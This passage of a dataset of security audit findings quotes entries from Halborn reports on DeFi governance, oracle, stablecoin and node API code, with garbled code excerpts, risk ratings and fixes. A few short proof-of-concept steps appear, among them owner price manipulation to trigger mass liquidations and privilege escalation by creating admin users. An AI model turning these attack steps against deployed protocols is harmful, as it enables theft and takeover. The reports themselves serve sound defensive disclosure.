, WeightSources memory weightSources ) external returns ( uint256 ) { // Ensure msg . sender has enough voting weight ( uint256 weightKAP , uint256 weightLP ) = getWeights (  weightSources ); 147 148 149 150 151 require ( weightKAP + convertLP ( weightLP ) >= threshold , \" Governance : Insufficient weight \" ); // Make sure haven 't already created a proposal within  cooldown period , Propose CoolDown 152 153 uint256 timestamp = block . timestamp ; require ( 29 154 timestamp >= latestPropose [ msg . sender ] +  proposeCooldown , 155 156 157 158 \" Governance : Propose Cooldown \" ); // Add new proposal Risk Level: Likelihood - 3 Impact - 2 Recommendation: If is recommended to initialize all variables in the same function, either in the constructor or in a custom init method. However, using uninitialized variables and expecting them to have a value could cause unexpected behaviors in the flow of execution. Remediation Plan: SOLVED: The Playground labs team solved the above issue in the commit As a result, the team ini- 35fb92524b83ff8197a7127f7c9819317ac7ea92. tializes proposeCooldown to 3 days (same as the voting period) so that the voting process is never overwhelmed by repeated proposals. Listing 14: Constructor Initialize propseCooldown 1 2 // implicitly set propseCooldown to be the voting period proposeCooldown = _waitTo . endVote - _waitTo . startVote ; 30 ", "labels": ["Halborn", "PlayGround_Labs_Kapital_DAO", "Severity: Low"]}, {"title": "EXTERNAL FUNCTION CALLS WITHIN LOOP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "External calls within a loop increase Gas usage or can lead to a denial of service attack. In the Governance.sol contract functions discovered there is a for loop on the i variable that iterates through the weightSources .kapSources.length and weightSources.lpSources.length array length, and this loop has external calls within a loop. If this integer evaluates to extremely large numbers, this can cause a DoS. Code Location: Listing 15: Governance.sol (Lines 104,96-98) function getWeights ( WeightSources memory weightSources ) public view returns ( uint256 weightKAP , uint256 weightLP ) { 88 89 90 91 92 93 94  ++) { 95 96  weightKAP ( 97 98 99 100 101 102 // Calc KAP voting weight for ( uint256 i = 0; i < weightSources . kapSources . length ; i if ( weightSources . kapSources [i ]) { weightKAP += IKAPSource ( weightSourcesKAP [ i ]) . msg . sender ); } } // Calc LP voting weight for ( uint256 i = 0; i < weightSources . lpSources . length ; i  ++) { 103 104 if ( weightSources . lpSources [ i ]) { weightLP += ILPSource ( weightSourcesLP [ i ]) . weightLP  ( msg . sender ); } 105 106 107 } } 31 Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended that you set the maximum length over which a for loop can iterate. If possible, use the pull over push strategy for external calls. Reference: External Calls Recommendation Remediation Plan: SOLVED: The Playground labs team solved the above issue in commit 35fb92524b83ff8197a7127f7c9819317ac7ea92. the WeightSources and getWeights structs; as a result, the user can now choose specific array indices in weightSourcesKAP and weightSourcesLP . the team added that in the unlikely case that weightSourcesKAP and weightSourcesLP are very long, the user can choose a relatively small number of WeightSources to loop through. Furthermore, modifies team The 32 ", "labels": ["Halborn", "PlayGround_Labs_Kapital_DAO", "Severity: Low"]}, {"title": "IGNORE RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The return value of an external call is not stored in a local or state variable. In the Transactor.sol contract, there is an instance where an external method is called, and the return value is ignored. Code Location: Listing 16: Transactor.sol (Lines 39,41) function _transact ( address [] memory targets , uint256 [] memory values , bytes [] memory data , bool [] memory isDelegateCall ) internal { require ( targets . length > 0, \" Invalid array length \"); require ( targets . length == values . length , \" Array length require ( targets . length == data . length , \" Array length require ( targets . length == isDelegateCall . length , \" Array length mismatch \" for ( uint256 i = 0; i < targets . length ; i ++) { if ( isDelegateCall [ i ]) { Address . functionDelegateCall ( targets [ i ], data [ i ]) ; } else { Address . functionCallWithValue ( targets [ i], data [ i], } 33 23 24 25 26 27 28 29 30  mismatch \" ); 31  mismatch \" ); 32 33 34 35 36 37 38 39 40 41  values [ i ]) ; 42 43 44 ); } } Risk Level: Likelihood - 3 Impact - 2 Recommendation: Add return value checking to prevent an unexpected contract crash. Check- ing the return value will help to handle exceptions in a better way. Remediation Plan: RISK ACCEPTED: The Playground labs team accept the risk of this finding. Furthermore, the team claims that the team does not have any function- specific return value due to not having information about which functions can be called in advance. However, the team added that the Address contract confirms that success == true and reverts otherwise. 34 ", "labels": ["Halborn", "PlayGround_Labs_Kapital_DAO", "Severity: Low"]}, {"title": "WEAK GOVERNANCE OWNERSHIP TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The supplied newGovernance is not being validated before the transfer of ownership, even though the governance access control is in place. If configured incorrectly, it will lock all governance functionality. PoC Steps: Listing 17: GovernanceRegistry.sol (Lines 29,30) 28 29 30 31 function changeGovernance ( address newGovernance ) external { require ( msg . sender == governance , \" Only governance \" ); governance = newGovernance ; } Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider validating that the new governance address is different from address zero. Furthermore, two-step approvals must be set to avoid setting the wrong addresses. The first function will store an address in a global variable, and the second function will confirm the new address if msg.sender equals the new address, proving that the new owner has access to the correct private key. 35 Remediation Plan: SOLVED: The Playground labs team solved the above issue in commit As a result, the team added 35fb92524b83ff8197a7127f7c9819317ac7ea92. a two-step governance change process. Furthermore, the team also added additional validation of the new governance address. Listing 18: Updated changeGovernance function changeGovernance ( address newGovernance ) external { require ( msg . sender == governance , \" Only governance \" ); require ( newGovernance != address (0) && newGovernance != \" Invalid governance \" IGovernance _newGovernance = IGovernance ( newGovernance ); require ( _newGovernance . votingPeriod () > 0) ; appointedNewGovernance = newGovernance ; 1 2 3 4  governance , 5 6 7 8 9 10 11 12 ); } 36 ", "labels": ["Halborn", "PlayGround_Labs_Kapital_DAO", "Severity: Low"]}, {"title": "MISSING LEGITIMACY OF VOTE CASTER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the Governance.sol contract, it is noted that the vote function lacks the legitimacy of msg.sender if it is a valid voter. As a result, an unknown EOA or contract may cast a vote; therefore, the result of the vote can be manipulated, although it is unlikely since there are no benefits for said voter. Code Location: Listing 19: Governance.sol 197 198 199 200 201 202 203 204 205 function vote ( uint256 proposalID , bool yay , WeightSources memory weightSources ) external { Proposal storage proposal = proposals [ proposalID ]; // Enforce voting window , Voting Window require ( _checkVoteWindow ( proposal ) , \" Governance : Voting  window \"); 206 207 208 // Mark msg . sender as having voted , Already Voted require (! proposal . hasVoted [ msg . sender ], \" Governance :  Already voted \" ); 209 210 211 proposal . hasVoted [ msg . sender ] = true ; ( uint256 weightKAP , uint256 weightLP ) = getWeights (  weightSources ); 212 213 214 // Add to vote counts require ( weightLP <= type ( uint112 ). max , \" Governance :  uint112 ( weightLP ) \" ); 215 216 217 if ( yay ) { proposal . yaysKAP += SafeCast . toUint96 ( weightKAP ); proposal . yaysLP += uint112 ( weightLP ); 37 218 219 220 221 222 223 224 225 226 } else { proposal . naysKAP += SafeCast . toUint96 ( weightKAP ); proposal . naysLP += uint112 ( weightLP ); } // Record that ` msg . sender ` last voted at this timestamp lastVoted [ msg . sender ] = block . timestamp ; emit Voted ( msg . sender , proposalID , yay , weightKAP ,  weightLP ); } 227 Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to implement a valid whitelist of members who can cast Otherwise, validate msg.sender and ensure that a vote on a proposal. only valid EOA interacts with purpose. Consider adding the validSender modifier below to avoid the above issue. Listing 20 function isContract () public view returns ( bool ){ uint32 size ; address a = msg . sender ; assembly { size := extcodesize ( a ) } require ( size ==0) ; 1 2 3 4 5 6 7 8 9 10 11 12  \" Only - EOA \" ); 13 _ ; } modifier validSender ( address sender ) { require (! sender . isContract () && ( tx . origin == msg . sender ) , 38 14 } Remediation Plan: requirement descriptive As a solution, SOLVED: The Playground labs team solved the above issue in commit 35fb92524b83ff8197a7127f7c9819317ac7ea92. the team a require(weightKAP > 0 || weightLP > 0, \" Governance: Zero weight\") to prevent zero-weight accounts from voting Furthermore, the team claims that the team allows unnecessarily. contracts, particularly multisig wallets, to stake and vote. And the only requirement to propose is to meet the threshold that the team has currently initialized at 0.65% of the total KAP supply, and there is no whitelist of proposals. 39 ", "labels": ["Halborn", "PlayGround_Labs_Kapital_DAO", "Severity: Low"]}, {"title": "USAGE OF BLOCK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/PlayGround_Labs_Kapital_DAO_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Labs Kapital-DAO contracts were observed. During a manual review, the use of block.timestamp in some Playground Contract developers should note that this does not mean the current time. Miners can influence the value of block.timestamp to some degree, so testers should be warned that this may come at some risk if miners collude in time manipulation to influence price oracles. It is important to follow the 15-second rule, i.e., if the contract is not based on an interval of less than 15-seconds, it is fine to use block.timestamp. Code Location: Listing 21: Vesting.sol 1 #101: block . timestamp > vestingAgreement . vestStart , 2 #107: if ( block . timestamp >= ( vestingAgreement . vestStart +  VESTING_PERIOD )) { 3 #114: ( block . timestamp - vestingAgreement . vestStart )) / 4 #148: block . timestamp > oldDelegateLastVoted + votingPeriod , Listing 22: Governance.sol 1 #152: uint256 timestamp = block . timestamp ; 2 #187: uint256 timeElapsed = block . timestamp - proposal . proposeTime  ; 3 #224: lastVoted [ msg . sender ] = block . timestamp ; 4 #239: uint256 timeElapsed = block . timestamp - proposal . proposeTime  ; 5 #323: emit ProposalExecuted ( msg . sender , proposalID , block .  timestamp ); 6 #350: ( block . timestamp - proposal . proposeTime ); 40 Listing 23: Staking.sol 1 #148: ( block . timestamp <= ( lastStaked [ voter ] + votingPeriod )) 2 #161: if ( block . timestamp <= rewardsStart ) { 3 #182: if ( block . timestamp > lastSync ) { 4 #185: lastStaked [ msg . sender ] = block . timestamp ; 5 #230: if ( block . timestamp > lastSync ) { 6 #244: block . timestamp >= stakingAgreement . lockEnd , 7 #288: if ( block . timestamp > lastSync ) { 8 #295: if ( block . timestamp <= rewardsStart ) { 9 #320: require ( block . timestamp > lastSync , \" Staking : Already syncd \"  ); 10 #323: if ( block . timestamp > rewardsRules [ rewardsRuleIndex ]. timeEnd  ) { 11 #419: if ( block . timestamp <= rewardsRule . timeEnd ) { 12 #470: uint256 lockStart = block . timestamp <= rewardsStart Listing 24: RewardsLocker.sol 1 #97: block . timestamp >= lockAgreement . availableTimestamp , Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to follow the 15-second rule, i.e., if the time- dependent event can vary by 15 seconds and maintain integrity, it is safe to use a block.timestamp. Reference: Ethereum Yellow Paper 41 Remediation Plan: RISK ACCEPTED: The Playground labs team accepted the risk of this finding. 42 3.10 (HAL-10) MISSING ZERO-ADDRESS CHECK - INFORMATIONAL ", "labels": ["Halborn", "PlayGround_Labs_Kapital_DAO", "Severity: Informational"]}, {"title": "LOGS WITH NEWLINE CANNOT BE PARSED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Debridge_solana_tx_parser_Whitebox_Pentest_Report_Halborn_Final.pdf", "body": "Solana supports log messages with newline character \\n. However, it was observed that solana-tx-parser cannot parse such logs. If a user sends a transaction to a program that emits a log message in which there is a new line character, the library will reject such transaction and will not parse it, even if all following logs contain only flat messages without newlines. Code location: Listing 1: solana-tx-parser/src/helpers.ts (Line 161) 160 if ( !match || !match . groups ) { 161 162 } throw new Error ( ` Failed to parse log line : $ { log } `) ; Risk Level: Likelihood - 3 Impact - 4 Proof Of Concept: 1. Create a program with an instruction handler that contains the following code: Listing 2: (Line 12) 11 pub fn some_instruction ( ctx : Context < Context >) -> Result <() > { 12 13 14 } msg! ( \" Log with new line \\ n \"); Ok (() ) 13 2. Deploy the program and send a transaction targeting that handler. Observe that the instruction is executed correctly and the following log message was emitted: Listing 3: (Line 17) Program log : Instruction : InitializeSendBridge Program log : Log with new line 14 Program ChtRDTGjhUYubbavybASVJv3h7ZsfDzURvPFemgfRbcb invoke [1] 15 16 17 18  5226 of 200000 compute units 19 Program ChtRDTGjhUYubbavybASVJv3h7ZsfDzURvPFemgfRbcb success Program ChtRDTGjhUYubbavybASVJv3h7ZsfDzURvPFemgfRbcb consumed 3. Try to parse the transaction with solana-tx-parser and observe that the parser throws an error. Recommendation: It is recommended to gracefully handle parsing transactions with log messages that span over multiple lines and which including the newline character. Remediation Plan: The parsing fixed SOLVED: regex multiline 63fdd1afbae5f0ae2788e0f77ce5616d05415f54. DeBridge team accept to this issue by messages log changing in the commit 14 ", "labels": ["Halborn", "Debridge_solana_tx_parser_Whitebox_Pentest", "Severity: Medium"]}, {"title": "TRUNCATED LOGS CANNOT BE PARSED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Debridge_solana_tx_parser_Whitebox_Pentest_Report_Halborn_Final.pdf", "body": "Such logs appear as Solana truncates log messages that are too long. Log truncated in transaction log trail. However, it was observed that solana-tx-parser cannot parse such logs. If a user supplies a transaction to a program that emits a truncated log message, such transaction will be rejected and will not be able to be parsed by the library. Code location: Listing 4: solana-tx-parser/src/helpers.ts (Line 161) 160 if ( !match || !match . groups ) { 161 162 } throw new Error ( ` Failed to parse log line : $ { log } `) ; Listing 5: solana-tx-parser/src/helpers.ts (Line 151) 150 const parserRe = 151 /(? < programInvoke >^ Program (? < invokeProgramId >[1 -9 A - HJ - NP - Za -  km - z ]{32 ,}) invoke \\[(? < level >\\ d +) \\] $ ) |(? < programSuccessResult >^  Program (? < successResultProgramId >[1 -9 A - HJ - NP - Za - km -z ]{32 ,})  success$ ) |(? < programFailedResult >^ Program (? < failedResultProgramId  >[1 -9 A -HJ -NP -Za -km -z ]{32 ,}) failed : (? < failedResultErr >.*) $ ) |(? <  programCompleteFailedResult >^ Program failed to complete : (? <  failedCompleteError >.*) $) |(? < programLog >^^ Program log : (? <  logMessage >.*) $ ) |(? < programData >^ Program data : (? < data >.*) $ ) |(? <  programConsumed >^ Program (? < consumedProgramId >[1 -9 A -HJ -NP -Za -km -z  ]{32 ,}) consumed (? < consumedComputeUnits >\\ d *) of (? <  allComputedUnits >\\ d *) compute units$ ) |(? < programReturn >^ Program  return : (? < returnProgramId >[1 -9 A -HJ -NP - Za - km - z ]{32 ,}) (? <  returnMessage >.*) $ ) /; 152 const result : LogContext [] = []; 15 Proof Of Concept: 1. Create a program with instruction handler that contains the following code: Listing 6: (Line 12) 11 pub fn some_instruction ( ctx : Context < Context >) -> Result <() > { 12 13 14 } msg! ( \"{ PUT LONG STRING HERE , AT LEAST 10 000 characters } \"); Ok (() ) 2. Deploy the program and send a transaction targeting that handler. Observe that the instruction is correctly executed, and the following log message was emitted: Listing 7: (Line 17) Program ChtRDTGjhUYubbavybASVJv3h7ZsfDzURvPFemgfRbcb invoke Log Messages : 14 15  [1] 16 17 18  18594 of 200000 compute units 19 Program log : Instruction : InitializeSendBridge Log truncated Program ChtRDTGjhUYubbavybASVJv3h7ZsfDzURvPFemgfRbcb consumed Program ChtRDTGjhUYubbavybASVJv3h7ZsfDzURvPFemgfRbcb success 3. Try to parse the transaction with solana-tx-parser and observe that the parser throws an error. Risk Level: Likelihood - 2 Impact - 4 16 Recommendation: It is recommended to gracefully handle parsing transactions with log messages that are truncated by the Solana runtime. Remediation Plan: SOLVED: The DeBridge team fixed this issue by changing parsing logic to handle truncated logs in commit 63fdd1afbae5f0ae2788e0f77ce5616d05415f54. 17 ", "labels": ["Halborn", "Debridge_solana_tx_parser_Whitebox_Pentest", "Severity: Medium"]}, {"title": "PRICE MANIPULATION RISK IN STETHORACLE CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ERD_Ethereum_Reserve_Dollar_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "If the owners private key of the contract StETHOracle.sol gets stolen, or the owner himself acts maliciously, it is possible to directly manipulate the price oracle by calling the setPrice() function and updating the lastGoodPrice storage variable without using Chainlink. Hence, all parts of the protocol using fetchPrice_view() would get as a result an incorrect price for the token. Code Location: Listing 1: StETHOracle.sol (Line 339) 338 function setPrice ( uint _price ) external onlyOwner { 339 340 341 } lastGoodPrice = _price ; emit LastGoodPriceUpdated ( _price ); Listing 2: StETHOracle.sol (Line 139) 138 function fetchPrice_view () external view override returns ( uint256  ) { 139 140 } return lastGoodPrice ; 20 Proof of Concept: 1. The owner calls setPrice() and significantly decreases the token price. 2. All active troves now have ICR < MCR, hence can be liquidated. 3. Liquidate all troves and distribute all the rewards. 4. Set the correct token price again. BVSS: AO:A/AC:L/AX:L/C:N/I:H/A:N/D:M/Y:M/R:P/S:U (5.0) Recommendation: Updating the lastGoodPrice storage variable is only recommended by re- questing it to Chainlink and checking if the response is acceptable. Remediation Plan: SOLVED: The ERD team solved the issue with the following commit ID. Commit ID : 6657817edcc30b48e41836756a3f41fa34ef779d 21 ", "labels": ["Halborn", "ERD_Ethereum_Reserve_Dollar", "Severity: Medium"]}, {"title": "NON", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ERD_Ethereum_Reserve_Dollar_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The owner of the Migrations.sol contract is set in the constructor() and cannot be changed anymore. If there is any issue with the owner account, the contract can be left useless without being able to change the ownership to a new address. Code Location: Listing 3: Migrations.sol (Line 14) 13 constructor () { 14 15 } owner = msg . sender ; Listing 4: Migrations.sol (Line 10) 9 modifier restricted () { 10 11 } if ( msg . sender == owner ) _; BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:M/D:N/Y:N/R:P/S:U (2.5) Recommendation: The use of Ownable contract from OpenZeppelin is recommended to handle the ownership of the contract. 22 Remediation Plan: SOLVED: The ERD team solved the issue with the following commit ID. Commit ID : 95ad8f438291ec082f34dab97dc57ecf2494209c 23 ", "labels": ["Halborn", "ERD_Ethereum_Reserve_Dollar", "Severity: Low"]}, {"title": "POSSIBLE DOS DUE TO COLLATERALMANAGER.COLLATERALSUPPORT SIZE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ERD_Ethereum_Reserve_Dollar_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The owner of the CollateralManager.sol contract can add new collateral tokens which will be supported by the protocol. When adding support for new collaterals, there is no limit for the current amount of collaterals supported, and as the addresses of the collaterals are pushed to an array (collateralSupport), the size of this array can grow considerably over time. Hence, when the protocol calls priceUpdate() to update the price of all collaterals supported by the protocol, it iterates over all the collaterals fetching their price from their oracles. In the case the size of the array has grown significantly, it could be possible the price update will revert due to reaching the transaction gas limit. Code Location: Listing 5: CollateralManager.sol (Line 127) address _collateral , address _oracle , address _eTokenAddress , uint256 _ratio 111 function addCollateral ( 112 113 114 115 116 ) external override onlyOwner { 117 118 119 120 121 122 123 124 125 _ratio , _eTokenAddress , _oracle , DataTypes . CollStatus (1) , collateralsCount require (! getIsSupport ( _collateral ) , Errors . CM_COLL_EXISTS ); _requireRatioLegal ( _ratio ); collateralParams [ _collateral ] = DataTypes . CollateralParams ( 24 126 127 128 129 } ); collateralSupport . push ( _collateral ); collateralsCount = collateralsCount . add (1) ; Listing 6: CollateralManager.sol (Line 246) 242 function priceUpdate () public override { 243 if ( collateralsCount < 2) { 244 245 246 247 } for ( uint256 i = 1; i < collateralsCount ; ) { return ; IOracle ( collateralParams [ collateralSupport [ i ]]. oracle ).  fetchPrice () ; unchecked { i ++; } } 248 249 250 251 252 } BVSS: AO:S/AC:L/AX:L/C:N/I:N/A:C/D:N/Y:N/R:P/S:U (1.0) Recommendation: It is strongly recommended to set a cap for the amount of collaterals supported by the protocol. Remediation Plan: SOLVED: The ERD team solved the issue with the following commit ID. Commit ID : 93c803ae22a7676e05a1fa6ec884589de28fd619 25 ", "labels": ["Halborn", "ERD_Ethereum_Reserve_Dollar", "Severity: Informational"]}, {"title": "MISSING A CAP FOR EUSD GAS COMPENSATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ERD_Ethereum_Reserve_Dollar_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The owner of the CollateralManager.sol contract, when setting the EUSD_GAS_COMPENSATION protocol parameter within setGasCompensation() function, there are no checks regarding the quantity being set. Code Location: Listing 7: CollateralManager.sol (Line 756) 755 function setGasCompensation ( uint256 _gas ) external override  onlyOwner { EUSD_GAS_COMPENSATION = _gas ; 756 757 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:P/S:U (0.0) Recommendation: An important parameter for the protocol as is EUSD_GAS_COMPENSATION, which plays a vital role, it is strongly recommended to set a cap for it. Remediation Plan: SOLVED: The ERD team solved the issue with the following commit ID. Commit ID : 1961c7fc04181f770468d575b5b402a07b8ab239 26 ", "labels": ["Halborn", "ERD_Ethereum_Reserve_Dollar", "Severity: Informational"]}, {"title": "LONG LITERAL UINT256 USED IN COLLATERALMANAGER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ERD_Ethereum_Reserve_Dollar_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "Critical protocol parameters are set within the initialize() function of Specifically, MCR (minimum collateral CollateralManager.sol contract. ratio) and CCR (critical collateral ratio) are set using a long literal. This can lead to confusion on the percentages configured for the correct functionality of the whole protocol. Code Location: Listing 8: CollateralManager.sol (Lines 63,64) __Ownable_init () ; BOOTSTRAP_PERIOD = 14 days ; MCR = 1100000000000000000; // 110% CCR = 1300000000000000000; // 130% EUSD_GAS_COMPENSATION = 200 e18 ; MIN_NET_DEBT = 1800 e18 ; BORROWING_FEE_FLOOR = ( DECIMAL_PRECISION / 10000) * 75; // 60 function initialize () public initializer { 61 62 63 64 65 66 67  0.75% 68 69  0.75% 70 71 72 } RECOVERY_FEE = ( DECIMAL_PRECISION / 10000) * 25; // 0.25% MAX_BORROWING_FEE = ( DECIMAL_PRECISION / 100) * 5; // 5% REDEMPTION_FEE_FLOOR = ( DECIMAL_PRECISION / 10000) * 75; // BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:P/S:U (0.0) 27 Recommendation: To avoid any confusion or human errors while setting those parameters, the use of exponentiation (11e17, 13e17, etc.) is recommended instead. Remediation Plan: SOLVED: The ERD team solved the issue with the following commit ID. Commit ID : 0aaf1539e5897aca96034f20f82a0ec1a8d45182 28 ", "labels": ["Halborn", "ERD_Ethereum_Reserve_Dollar", "Severity: Informational"]}, {"title": "MISSING REQUIREISCONTRACT CHECK IN COLLATERALMANAGER.SETADDRESSES(", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ERD_Ethereum_Reserve_Dollar_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the CollateralManager.sol contract, when setting the contract ad- dresses using setAddresses(), the _requireIsContract() check is missing for _troveManagerRedemptionsAddress. Code Location: Listing 9: CollateralManager.sol (Line 98) 74 function setAddresses ( address _activePoolAddress , 75 address _borrowerOperationsAddress , 76 address _defaultPoolAddress , 77 address _priceFeedAddress , 78 address _troveManagerAddress , 79 address _troveManagerRedemptionsAddress , 80 address _wethAddress 81 82 ) external override onlyOwner { 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 _requireIsContract ( _activePoolAddress ); _requireIsContract ( _borrowerOperationsAddress ); _requireIsContract ( _defaultPoolAddress ); _requireIsContract ( _priceFeedAddress ); _requireIsContract ( _wethAddress ); _requireIsContract ( _troveManagerAddress ); borrowerOperationsAddress = _borrowerOperationsAddress ; activePool = IActivePool ( _activePoolAddress ); defaultPool = IDefaultPool ( _defaultPoolAddress ); priceFeed = IPriceFeed ( _priceFeedAddress ); wethAddress = _wethAddress ; troveManager = ITroveManager ( _troveManagerAddress ); 29 troveManagerRedemptionsAddress = 98  _troveManagerRedemptionsAddress ; 99 100 101 emit ActivePoolAddressChanged ( _activePoolAddress ); emit BorrowerOperationsAddressChanged (  _borrowerOperationsAddress ); emit DefaultPoolAddressChanged ( _defaultPoolAddress ); emit PriceFeedAddressChanged ( _priceFeedAddress ); emit TroveManagerAddressChanged ( _troveManagerAddress ); emit TroveManagerRedemptionsAddressChanged ( _troveManagerRedemptionsAddress ); emit WETHAddressChanged ( _wethAddress ); 102 103 104 105 106 107 108 109 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:P/S:U (0.0) Recommendation: as is the case with When the address needs to be a contract, _troveManagerRedemptionsAddress, it is recommended to check it as done for the rest of the parameters. Remediation Plan: SOLVED: The ERD team solved the issue with the following commit ID. Commit ID : f77899108075aef9f90e1e31ab4e1ab22c20d89c 30 MANUAL TESTING 31 The main goal of the manual testing performed during this assessment was to test all the functionalities regarding the ERD stablecoin overall protocol, focusing on the following points/scenarios: 1. Tests focused on borrowing EUSD and adding collateral to the troves (as a borrower of the protocol and using multiple collateral tokens)  Open a new trove with ERC20 tokens as collateral.  Open a new trove with ETH as collateral.  Add more collateral to the troves.  Check how the new ICR is calculated.  Check how the new index of the trove is calculated and reinserted. G N I T S E T L A U N A M 32 2. Tests focused on repaying EUSD and withdrawing collateral from the troves (as a borrower of the protocol and using multiple collateral tokens)  Repay 50% of the trove debt.  Withdraw some collateral from the trove.  Check how the new ICR is calculated.  Check how the new index of the trove is calculated and reinserted.  Check if exist a situation where the borrower cannot repay the debt. G N I T S E T L A U N A M 33 3. Tests focused on providing liquidity to the stability pool (as an SP depositor of the protocol)  Only one depositor on the system as liquidity provider to the sta- bility pool.  More than one depositor as liquidity providers in the protocol.  Check the flow of the EUSD and collaterals tokens when active troves are updated.  Check the flow of the EUSD and collaterals tokens when a trove is liquidated. G N I T S E T L A U N A M 34 4. Tests focused on withdrawing liquidity from the stability pool (as an SP depositor of the protocol)  Depositor of EUSD withdrawing liquidity from the stability pool.  Check how the TCR is being affected.  Check how the shares of depositors are being recalculated. G N I T S E T L A U N A M 35 5. Tests focused on liquidations (checking the mode of the protocol and the different scenarios for closing the troves and distributing the rewards)  Basic checks when ICR < MCR, the trove can be liquidated.  Basic checks when ICR > MCR and TCR < CCR, the trove can be liquidated as well. G N I T S E T L A U N A M 36 6. Tests depending on the current mode of the protocol (normal or recovery mode, to check which protocol actions are permitted and not permitted during recovery mode)  Check if actions that mint EUSD are not permitted during recovery mode.  Check if actions that burn EUSD are incentivized for users during recovery mode. G N I T S E T L A U N A M 37 7. Combine and perform integration tests with all the critical func- tionalities within the protocol (borrowers, depositors, liquidators, redeemers)  Set 4 depositors as liquidity providers to the stability pool.  Set 4 borrowers of EUSD.  Set 2 redeemers of EUSD.  Change the price of the collateral in the oracle.  Redeemers redeem collateral.  Troves being liquidated.  Check the flow of EUSD and collateral tokens and check the priority collateral logic is properly working. G N I T S E T L A U N A M 38 8. Deeply test all the possible cases of the system state and a specific trove being liquidated to ensure distributions of collaterals and rewards are correctly done as explained within the documentation (between depositors, active troves and the different pools).  ICR < MCR & SP.EUSD >= trove.debt & TCR >= 130%  ICR < MCR & SP.EUSD < trove.debt & TCR >= 130%  ICR < MCR & SP.EUSD = 0 & TCR >= 130%  ICR <=100% & TCR < 130%  100% < ICR < MCR & SP.EUSD > trove.debt & TCR < 130%  100% < ICR < MCR & SP.EUSD < trove.debt & TCR < 130%  MCR <= ICR < TCR & SP.EUSD >= trove.debt & TCR < 130% G N I T S E T L A U N A M 39 9. Tests focused on using multiple collaterals instead of just one type, and analyze how the protocol handles the different user actions involved  Add support for multiple collateral tokens.  Check how the system handles when priority collateral logic is executed.  Check how collaterals are calculated when opening a trove.  Check how collaterals are recalculated when adding a specific col- lateral to an already active trove.  Check how the system merges the ETH with collaterals into the protocol collaterals array. G N I T S E T L A U N A M 10. Moreover, and very importantly, theoretically review all cases to make sure contracts have the correct business logic for the proper functionality of the stablecoin overall protocol 40 ", "labels": ["Halborn", "ERD_Ethereum_Reserve_Dollar", "Severity: Informational"]}, {"title": "API", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf", "body": "Inside the user_router within the create_user function which is respon- sible for creating new users, it was noted that the function requires only an authenticated user without any special permissions. The user parameter within create_user is based on the UserCreate schema which includes user_role, the attacker can provide any role within the request and create a user with any role, including the admin role. Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to restrict user creation to the admin role only and remove user_role from UserCreate request schema. Remediation Plan: SOLVED: The Playground Labs team solved the issue by adding the permission checking class. 6e0368d70f706452d4bc940c08beec485ebd6093 12 ", "labels": ["Halborn", "Playground_Labs_Self_Custody_Node", "Severity: Critical"]}, {"title": "API", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf", "body": "Within the user_router inside the delete_user function which is respon- sible for deleting any user on the system, it was noted that the function requires only an authenticated user without any special permissions to delete any user on the system, including admin users. Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to restrict the delete user function to the admin role only. Remediation Plan: SOLVED: The Playground Labs team solved the issue by adding the permis- sions check class. 6e0368d70f706452d4bc940c08beec485ebd6093 13 ", "labels": ["Halborn", "Playground_Labs_Self_Custody_Node", "Severity: Critical"]}, {"title": "ARCHITECTURE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Node Audits/Playground_Labs_Self_Custody_Node_Security_Audit_Report_Halborn_Final.pdf", "body": "The authorization scheme within the API was observed, which allows an attacker to interact with the Node and perform privileged actions such as axie_claim or even sign transactions and interact with wallets by only sending the wallet address as an HTTP 